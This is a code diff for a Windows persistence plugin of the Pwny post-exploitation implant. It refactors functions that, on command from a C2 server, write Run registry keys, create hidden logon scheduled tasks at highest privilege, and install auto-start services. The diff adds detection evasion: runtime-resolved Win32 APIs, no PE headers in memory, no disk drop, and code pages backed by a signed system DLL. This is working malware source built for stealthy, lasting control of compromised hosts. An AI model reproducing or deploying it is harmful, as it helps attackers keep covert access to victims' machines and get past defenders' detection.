@@ -1,7 +1,7 @@
 /*
  * MIT License
  *
- * Copyright (c) 2020-2024 EntySec
+ * Copyright (c) 2020-2026 EntySec
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -23,41 +23,97 @@
  */
 
 /*
- * Persist tab plugin — persistence mechanisms.
+ * Persist COT plugin — persistence mechanisms.
  *
- * Moved out of the core DLL to reduce the static detection
- * surface. Loaded on demand as a tab DLL via pe_load().
+ * Built as a COT (Code-Only Tab) blob: no PE headers in memory,
+ * no disk drop, all executable pages backed by a signed system DLL.
+ * All Pwny API calls go through the vtable; all Win32 APIs are
+ * resolved at runtime via cot_resolve().
  */
 
 #ifdef __windows__
 
-#include <pwny/tab_dll.h>
+#include <pwny/api.h>
+#include <pwny/tlv_types.h>
+#include <pwny/c2.h>
 
 #include <windows.h>
-#include <pwny/c2.h>
-#include <pwny/log.h>
 
-#define PERSIST_BASE 27
+/* tab_cot.h MUST come after the real Pwny headers */
+#define COT_PLUGIN
+#include <pwny/tab_cot.h>
+
+/* ------------------------------------------------------------------ */
+/* Win32 / CRT function pointer types — resolved at init               */
+/* ------------------------------------------------------------------ */
+
+typedef LONG      (WINAPI *fn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD,
+                                             REGSAM, PHKEY);
+typedef LONG      (WINAPI *fn_RegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD,
+                                              const BYTE *, DWORD);
+typedef LONG      (WINAPI *fn_RegCloseKey)(HKEY);
+typedef LONG      (WINAPI *fn_RegDeleteValueA)(HKEY, LPCSTR);
+typedef LONG      (WINAPI *fn_RegEnumValueA)(HKEY, DWORD, LPSTR, LPDWORD,
+                                             LPDWORD, LPDWORD, LPBYTE,
+                                             LPDWORD);
+typedef BOOL      (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR,
+                                              LPSECURITY_ATTRIBUTES,
+                                              LPSECURITY_ATTRIBUTES,
+                                              BOOL, DWORD, LPVOID, LPCSTR,
+                                              LPSTARTUPINFOA,
+                                              LPPROCESS_INFORMATION);
+typedef DWORD     (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
+typedef BOOL      (WINAPI *fn_CloseHandle)(HANDLE);
+typedef DWORD     (WINAPI *fn_GetLastError)(void);
+typedef SC_HANDLE (WINAPI *fn_OpenSCManagerA)(LPCSTR, LPCSTR, DWORD);
+typedef SC_HANDLE (WINAPI *fn_CreateServiceA)(SC_HANDLE, LPCSTR, LPCSTR,
+                                              DWORD, DWORD, DWORD, DWORD,
+                                              LPCSTR, LPCSTR, LPDWORD,
+                                              LPCSTR, LPCSTR, LPCSTR);
+typedef SC_HANDLE (WINAPI *fn_OpenServiceA)(SC_HANDLE, LPCSTR, DWORD);
+typedef BOOL      (WINAPI *fn_DeleteService)(SC_HANDLE);
+typedef BOOL      (WINAPI *fn_CloseServiceHandle)(SC_HANDLE);
+typedef int       (*fn__snprintf)(char *, size_t, const char *, ...);
+
+static struct
+{
+    fn_RegOpenKeyExA       pRegOpenKeyExA;
+    fn_RegSetValueExA      pRegSetValueExA;
+    fn_RegCloseKey         pRegCloseKey;
+    fn_RegDeleteValueA     pRegDeleteValueA;
+    fn_RegEnumValueA       pRegEnumValueA;
+    fn_CreateProcessA      pCreateProcessA;
+    fn_WaitForSingleObject pWaitForSingleObject;
+    fn_CloseHandle         pCloseHandle;
+    fn_GetLastError        pGetLastError;
+    fn_OpenSCManagerA      pOpenSCManagerA;
+    fn_CreateServiceA      pCreateServiceA;
+    fn_OpenServiceA        pOpenServiceA;
+    fn_DeleteService       pDeleteService;
+    fn_CloseServiceHandle  pCloseServiceHandle;
+    fn__snprintf           p_snprintf;
+} w;
+
 
 #define PERSIST_INSTALL \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       PERSIST_BASE, \
+                       TAB_BASE, \
                        API_CALL)
 
 #define PERSIST_REMOVE \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       PERSIST_BASE, \
+                       TAB_BASE, \
                        API_CALL + 1)
 
 #define PERSIST_LIST \
         TLV_TAG_CUSTOM(API_CALL_STATIC, \
-                       PERSIST_BASE, \
+                       TAB_BASE, \
                        API_CALL + 2)
 
-#define TLV_TYPE_PERSIST_TYPE  TLV_TYPE_CUSTOM(TLV_TYPE_INT, PERSIST_BASE, API_TYPE)
-#define TLV_TYPE_PERSIST_NAME  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PERSIST_BASE, API_TYPE)
-#define TLV_TYPE_PERSIST_CMD   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, PERSIST_BASE, API_TYPE + 1)
-#define TLV_TYPE_PERSIST_GROUP TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, PERSIST_BASE, API_TYPE)
+#define TLV_TYPE_PERSIST_TYPE  TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)
+#define TLV_TYPE_PERSIST_NAME  TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
+#define TLV_TYPE_PERSIST_CMD   TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)
+#define TLV_TYPE_PERSIST_GROUP TLV_TYPE_CUSTOM(TLV_TYPE_GROUP, TAB_BASE, API_TYPE)
 
 #define PERSIST_REGISTRY_HKCU  1
 #define PERSIST_REGISTRY_HKLM  2
@@ -93,17 +149,17 @@ static tlv_pkt_t *persist_install(c2_t *c2)
     {
         case PERSIST_REGISTRY_HKCU:
         {
-            lResult = RegOpenKeyExA(HKEY_CURRENT_USER, persist_run_key,
-                                    0, KEY_SET_VALUE, &hKey);
+            lResult = w.pRegOpenKeyExA(HKEY_CURRENT_USER, persist_run_key,
+                                       0, KEY_SET_VALUE, &hKey);
             if (lResult != ERROR_SUCCESS)
             {
                 log_debug("* persist: RegOpenKeyEx HKCU failed (%ld)\n", lResult);
                 return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
             }
 
-            lResult = RegSetValueExA(hKey, name, 0, REG_SZ,
-                                     (BYTE *)cmd, (DWORD)(strlen(cmd) + 1));
-            RegCloseKey(hKey);
+            lResult = w.pRegSetValueExA(hKey, name, 0, REG_SZ,
+                                        (BYTE *)cmd, (DWORD)(strlen(cmd) + 1));
+            w.pRegCloseKey(hKey);
 
             if (lResult != ERROR_SUCCESS)
             {
@@ -116,17 +172,17 @@ static tlv_pkt_t *persist_install(c2_t *c2)
 
         case PERSIST_REGISTRY_HKLM:
         {
-            lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, persist_run_key,
-                                    0, KEY_SET_VALUE, &hKey);
+            lResult = w.pRegOpenKeyExA(HKEY_LOCAL_MACHINE, persist_run_key,
+                                       0, KEY_SET_VALUE, &hKey);
             if (lResult != ERROR_SUCCESS)
             {
                 log_debug("* persist: RegOpenKeyEx HKLM failed (%ld)\n", lResult);
                 return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
             }
 
-            lResult = RegSetValueExA(hKey, name, 0, REG_SZ,
-                                     (BYTE *)cmd, (DWORD)(strlen(cmd) + 1));
-            RegCloseKey(hKey);
+            lResult = w.pRegSetValueExA(hKey, name, 0, REG_SZ,
+                                        (BYTE *)cmd, (DWORD)(strlen(cmd) + 1));
+            w.pRegCloseKey(hKey);
 
             if (lResult != ERROR_SUCCESS)
             {
@@ -143,10 +199,10 @@ static tlv_pkt_t *persist_install(c2_t *c2)
             STARTUPINFOA si;
             PROCESS_INFORMATION pi;
 
-            _snprintf(schtask_cmd, sizeof(schtask_cmd),
-                      "schtasks /Create /TN \"%s\" /TR \"%s\" "
-                      "/SC ONLOGON /RL HIGHEST /F",
-                      name, cmd);
+            w.p_snprintf(schtask_cmd, sizeof(schtask_cmd),
+                         "schtasks /Create /TN \"%s\" /TR \"%s\" "
+                         "/SC ONLOGON /RL HIGHEST /F",
+                         name, cmd);
             schtask_cmd[sizeof(schtask_cmd) - 1] = '\0';
 
             memset(&si, 0, sizeof(si));
@@ -155,17 +211,17 @@ static tlv_pkt_t *persist_install(c2_t *c2)
             si.wShowWindow = SW_HIDE;
             memset(&pi, 0, sizeof(pi));
 
-            if (!CreateProcessA(NULL, schtask_cmd, NULL, NULL, FALSE,
-                                CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+            if (!w.pCreateProcessA(NULL, schtask_cmd, NULL, NULL, FALSE,
+                                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
             {
                 log_debug("* persist: schtasks CreateProcess failed (%lu)\n",
-                          GetLastError());
+                          w.pGetLastError());
                 return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
             }
 
-            WaitForSingleObject(pi.hProcess, 10000);
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
+            w.pWaitForSingleObject(pi.hProcess, 10000);
+            w.pCloseHandle(pi.hThread);
+            w.pCloseHandle(pi.hProcess);
             break;
         }
 
@@ -174,29 +230,29 @@ static tlv_pkt_t *persist_install(c2_t *c2)
             SC_HANDLE scm;
             SC_HANDLE svc;
 
-            scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+            scm = w.pOpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
             if (scm == NULL)
             {
-                log_debug("* persist: OpenSCManager failed (%lu)\n", GetLastError());
+                log_debug("* persist: OpenSCManager failed (%lu)\n", w.pGetLastError());
                 return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
             }
 
-            svc = CreateServiceA(scm, name, name,
-                                 SERVICE_ALL_ACCESS,
-                                 SERVICE_WIN32_OWN_PROCESS,
-                                 SERVICE_AUTO_START,
-                                 SERVICE_ERROR_IGNORE,
-                                 cmd, NULL, NULL, NULL, NULL, NULL);
+            svc = w.pCreateServiceA(scm, name, name,
+                                    SERVICE_ALL_ACCESS,
+                                    SERVICE_WIN32_OWN_PROCESS,
+                                    SERVICE_AUTO_START,
+                                    SERVICE_ERROR_IGNORE,
+                                    cmd, NULL, NULL, NULL, NULL, NULL);
 
             if (svc == NULL)
             {
-                log_debug("* persist: CreateService failed (%lu)\n", GetLastError());
-                CloseServiceHandle(scm);
+                log_debug("* persist: CreateService failed (%lu)\n", w.pGetLastError());
+                w.pCloseServiceHandle(scm);
                 return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
             }
 
-            CloseServiceHandle(svc);
-            CloseServiceHandle(scm);
+            w.pCloseServiceHandle(svc);
+            w.pCloseServiceHandle(scm);
             break;
         }
 
@@ -228,15 +284,15 @@ static tlv_pkt_t *persist_remove(c2_t *c2)
     {
         case PERSIST_REGISTRY_HKCU:
         {
-            lResult = RegOpenKeyExA(HKEY_CURRENT_USER, persist_run_key,
-                                    0, KEY_SET_VALUE, &hKey);
+            lResult = w.pRegOpenKeyExA(HKEY_CURRENT_USER, persist_run_key,
+                                       0, KEY_SET_VALUE, &hKey);
             if (lResult != ERROR_SUCCESS)
             {
                 return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
             }
 
-            lResult = RegDeleteValueA(hKey, name);
-            RegCloseKey(hKey);
+            lResult = w.pRegDeleteValueA(hKey, name);
+            w.pRegCloseKey(hKey);
 
             if (lResult != ERROR_SUCCESS)
             {
@@ -247,15 +303,15 @@ static tlv_pkt_t *persist_remove(c2_t *c2)
 
         case PERSIST_REGISTRY_HKLM:
         {
-            lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, persist_run_key,
-                                    0, KEY_SET_VALUE, &hKey);
+            lResult = w.pRegOpenKeyExA(HKEY_LOCAL_MACHINE, persist_run_key,
+                                       0, KEY_SET_VALUE, &hKey);
             if (lResult != ERROR_SUCCESS)
             {
                 return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
             }
 
-            lResult = RegDeleteValueA(hKey, name);
-            RegCloseKey(hKey);
+            lResult = w.pRegDeleteValueA(hKey, name);
+            w.pRegCloseKey(hKey);
 
             if (lResult != ERROR_SUCCESS)
             {
@@ -270,8 +326,8 @@ static tlv_pkt_t *persist_remove(c2_t *c2)
             STARTUPINFOA si;
             PROCESS_INFORMATION pi;
 
-            _snprintf(schtask_cmd, sizeof(schtask_cmd),
-                      "schtasks /Delete /TN \"%s\" /F", name);
+            w.p_snprintf(schtask_cmd, sizeof(schtask_cmd),
+                         "schtasks /Delete /TN \"%s\" /F", name);
             schtask_cmd[sizeof(schtask_cmd) - 1] = '\0';
 
             memset(&si, 0, sizeof(si));
@@ -280,15 +336,15 @@ static tlv_pkt_t *persist_remove(c2_t *c2)
             si.wShowWindow = SW_HIDE;
             memset(&pi, 0, sizeof(pi));
 
-            if (!CreateProcessA(NULL, schtask_cmd, NULL, NULL, FALSE,
-                                CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+            if (!w.pCreateProcessA(NULL, schtask_cmd, NULL, NULL, FALSE,
+                                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
             {
                 return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
             }
 
-            WaitForSingleObject(pi.hProcess, 10000);
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
+            w.pWaitForSingleObject(pi.hProcess, 10000);
+            w.pCloseHandle(pi.hThread);
+            w.pCloseHandle(pi.hProcess);
             break;
         }
 
@@ -297,28 +353,28 @@ static tlv_pkt_t *persist_remove(c2_t *c2)
             SC_HANDLE scm;
             SC_HANDLE svc;
 
-            scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+            scm = w.pOpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
             if (scm == NULL)
             {
                 return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
             }
 
-            svc = OpenServiceA(scm, name, DELETE);
+            svc = w.pOpenServiceA(scm, name, DELETE);
             if (svc == NULL)
             {
-                CloseServiceHandle(scm);
+                w.pCloseServiceHandle(scm);
                 return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
             }
 
-            if (!DeleteService(svc))
+            if (!w.pDeleteService(svc))
             {
-                CloseServiceHandle(svc);
-                CloseServiceHandle(scm);
+                w.pCloseServiceHandle(svc);
+                w.pCloseServiceHandle(scm);
                 return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
             }
 
-            CloseServiceHandle(svc);
-            CloseServiceHandle(scm);
+            w.pCloseServiceHandle(svc);
+            w.pCloseServiceHandle(scm);
             break;
         }
 
@@ -343,8 +399,8 @@ static tlv_pkt_t *persist_list(c2_t *c2)
 
     result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 
-    lResult = RegOpenKeyExA(HKEY_CURRENT_USER, persist_run_key,
-                            0, KEY_READ, &hKey);
+    lResult = w.pRegOpenKeyExA(HKEY_CURRENT_USER, persist_run_key,
+                               0, KEY_READ, &hKey);
     if (lResult == ERROR_SUCCESS)
     {
         for (index = 0; ; index++)
@@ -352,8 +408,8 @@ static tlv_pkt_t *persist_list(c2_t *c2)
             nameLen = sizeof(valueName);
             dataLen = sizeof(valueData);
 
-            lResult = RegEnumValueA(hKey, index, valueName, &nameLen,
-                                    NULL, &valueType, valueData, &dataLen);
+            lResult = w.pRegEnumValueA(hKey, index, valueName, &nameLen,
+                                       NULL, &valueType, valueData, &dataLen);
             if (lResult != ERROR_SUCCESS)
             {
                 break;
@@ -370,11 +426,11 @@ static tlv_pkt_t *persist_list(c2_t *c2)
             }
         }
 
-        RegCloseKey(hKey);
+        w.pRegCloseKey(hKey);
     }
 
-    lResult = RegOpenKeyExA(HKEY_LOCAL_MACHINE, persist_run_key,
-                            0, KEY_READ, &hKey);
+    lResult = w.pRegOpenKeyExA(HKEY_LOCAL_MACHINE, persist_run_key,
+                               0, KEY_READ, &hKey);
     if (lResult == ERROR_SUCCESS)
     {
         for (index = 0; ; index++)
@@ -382,8 +438,8 @@ static tlv_pkt_t *persist_list(c2_t *c2)
             nameLen = sizeof(valueName);
             dataLen = sizeof(valueData);
 
-            lResult = RegEnumValueA(hKey, index, valueName, &nameLen,
-                                    NULL, &valueType, valueData, &dataLen);
+            lResult = w.pRegEnumValueA(hKey, index, valueName, &nameLen,
+                                       NULL, &valueType, valueData, &dataLen);
             if (lResult != ERROR_SUCCESS)
             {
                 break;
@@ -400,14 +456,53 @@ static tlv_pkt_t *persist_list(c2_t *c2)
             }
         }
 
-        RegCloseKey(hKey);
+        w.pRegCloseKey(hKey);
     }
 
     return result;
 }
 
-TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
+/* ------------------------------------------------------------------ */
+/* COT entry                                                           */
+/* ------------------------------------------------------------------ */
+
+COT_ENTRY
 {
+    /* Resolve advapi32.dll functions */
+    w.pRegOpenKeyExA      = (fn_RegOpenKeyExA)cot_resolve("advapi32.dll",
+                                                          "RegOpenKeyExA");
+    w.pRegSetValueExA     = (fn_RegSetValueExA)cot_resolve("advapi32.dll",
+                                                           "RegSetValueExA");
+    w.pRegCloseKey        = (fn_RegCloseKey)cot_resolve("advapi32.dll",
+                                                        "RegCloseKey");
+    w.pRegDeleteValueA    = (fn_RegDeleteValueA)cot_resolve("advapi32.dll",
+                                                            "RegDeleteValueA");
+    w.pRegEnumValueA      = (fn_RegEnumValueA)cot_resolve("advapi32.dll",
+                                                           "RegEnumValueA");
+    w.pOpenSCManagerA     = (fn_OpenSCManagerA)cot_resolve("advapi32.dll",
+                                                           "OpenSCManagerA");
+    w.pCreateServiceA     = (fn_CreateServiceA)cot_resolve("advapi32.dll",
+                                                           "CreateServiceA");
+    w.pOpenServiceA       = (fn_OpenServiceA)cot_resolve("advapi32.dll",
+                                                         "OpenServiceA");
+    w.pDeleteService      = (fn_DeleteService)cot_resolve("advapi32.dll",
+                                                          "DeleteService");
+    w.pCloseServiceHandle = (fn_CloseServiceHandle)cot_resolve("advapi32.dll",
+                                                               "CloseServiceHandle");
+
+    /* Resolve kernel32.dll functions */
+    w.pCreateProcessA      = (fn_CreateProcessA)cot_resolve("kernel32.dll",
+                                                            "CreateProcessA");
+    w.pWaitForSingleObject = (fn_WaitForSingleObject)cot_resolve("kernel32.dll",
+                                                                  "WaitForSingleObject");
+    w.pCloseHandle         = (fn_CloseHandle)cot_resolve("kernel32.dll",
+                                                         "CloseHandle");
+    w.pGetLastError        = (fn_GetLastError)cot_resolve("kernel32.dll",
+                                                          "GetLastError");
+
+    /* Resolve msvcrt.dll functions */
+    w.p_snprintf = (fn__snprintf)cot_resolve("msvcrt.dll", "_snprintf");
+
     api_call_register(api_calls, PERSIST_INSTALL, (api_t)persist_install);
     api_call_register(api_calls, PERSIST_REMOVE, (api_t)persist_remove);
     api_call_register(api_calls, PERSIST_LIST, (api_t)persist_list);
